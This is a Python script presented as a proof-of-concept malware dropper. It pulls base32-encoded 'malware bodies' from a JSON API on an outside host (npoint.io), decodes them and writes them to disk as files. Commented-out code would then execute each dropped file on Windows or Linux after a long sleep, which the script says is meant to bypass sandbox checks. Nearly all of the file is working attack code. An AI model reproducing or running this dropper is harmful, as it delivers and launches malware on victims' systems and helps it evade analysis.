##############################################################################
# Offline Py-JSON-Dropper - dropper - Python Script
# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies.
# Author: Dor Dahan
# License: MIT (See details in the LICENSE file or at the end of this script)
##############################################################################

import pip, platform, os, time

# Check the operating system
OS= platform.system()
WIN = False
LINUX = False
if OS == "Windows":
    WIN = True
elif OS == "Linux":
    LIN = True
# The API url fetch the json dropper
URL = "https://api.npoint.io/531896996f8103fa82c3"
# The pip packages to install
packages = ["requests"]

def install_package(package_name):
    """
    Will install the packages requirements for the script to run.
    :param package_name: The package name
    :return:
    """
    while True:
        try:
            pip.main(["install", package_name])
            break
        except Exception:
            continue

def execute_process(program, index):
    """
    Will check the OS and will act as need to the OS.
    :param program: The malware name
    :param index: The index number of the name
    :return:
    """
    import subprocess
    while True:
        try:
            if WIN:
                if not program.endswith(".exe"):
                    subprocess.run([program], check=True)
                ## If you want to use other script that are not exe file
                # else:
                #     with open(f"execute{index}.bat", "w") as file:
                #         file.write(f'@{programming_language} {program}')
                #     subprocess.run(["execute.bat"], check=True, shell=True)
                break
            elif LIN:
                subprocess.run(["chmod", "+x", program], check=True)
                subprocess.run([program], check=True)
                break
        except subprocess.CalledProcessError:
            continue

def main():
    import base64, requests
    # Getting the response from the api server
    response = requests.get(url=URL).json()
    names = []
    # Looping throw the keys in the json format
    for index, key in enumerate(response):
        # Create new file name via the index and file name
        filename = response[key]["fullName"].split(".")
        extension = filename[-1]
        # check if there is more than one dot in the file name
        if len(filename) > 2:
            filename = ".".join(filename[:-1])
        # Inserting the malware body into the new file name
        with open(f"{filename[0]}_{index}.{extension}", "wb") as file:
            # Fetch the body of the malware
            malware = response[key]["body"]
            # Encoding the body back to binary format
            decoded = malware.encode("utf-8")
            # Decoding the body to insert into the file
            decoded = base64.b32decode(decoded)
            names.append(f"{filename[0]}_{index}.{extension}")
            file.write(decoded)
    # ## If you enter this to dropper for execution after downloading
    ## For create a time interval between the download and the execution (bypass sandbox check)
    # time.sleep(10000)
    ## will execute the script by the order of download
    # for index, program in enumerate(names):
    #     execute_process(program, index)
    ## delete the bat file that are created
    # for index in range(len(names)):
    #     if os.path.isfile(f"execute{index}.bat"):
    #         os.remove(f"execute{index}.bat")



if __name__ == '__main__':
    # Install packages
    for package in packages:
        install_package(package)
    # Start the script
    main()

# License Information
# This script is open-source and released under the MIT License.
# MIT License
# Copyright (c) 2023 Dor Dahan
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# For more details, see the LICENSE file in the root directory of this repository
# or visit https://github.com/D0rDa4aN919/Py-JSON-Dropper.
